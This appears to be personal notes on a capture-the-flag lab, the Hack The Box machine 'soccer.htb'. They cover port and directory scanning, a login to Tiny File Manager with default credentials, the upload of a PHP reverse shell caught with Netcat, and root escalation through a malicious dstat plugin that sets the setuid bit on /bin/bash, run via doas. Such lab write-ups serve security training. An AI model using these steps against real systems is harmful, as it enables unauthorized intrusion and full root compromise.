We add soccer.htb to /etc/hosts

nmap -p- -sC -sV $IP

we have 3 ports open one ssh HTTP and 9091 is used for WebSockets


 gobuster dir -u http://soccer.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-medium-2.3.txt
 
 /tiny
 
 
 tiny file manager
 
 https://github.com/prasathmani/tinyfilemanager/wiki we check the configurations and find default credentials, we go ahead and use them on our site and they work
 
 We can upload a PHP reverse-shell into the tiny/upload directory as we can only upload there
 
 https://github.com/pentestmonkey/php-reverse-shell
 
 After uploading access the shell code through the web browser also before that start a Netcat listener of the port specified in the reverse shell

running lipeas.sh Found doas binary under setuid
Let's dig in, from doas.conf file found that we can run /usr/bin/dstat as root

After messing around some time found that we can load plugins from /usr/local/share/dstat/ directory which is writable, dstat plugin load uses wildcard so we can use any name for our plugin, dstat_"anything".py


import os
os.system('chmod +s /bin/bash')
		

/usr/local/bin/doas -u root  /usr/bin/dstat --pwn
	
bash -p
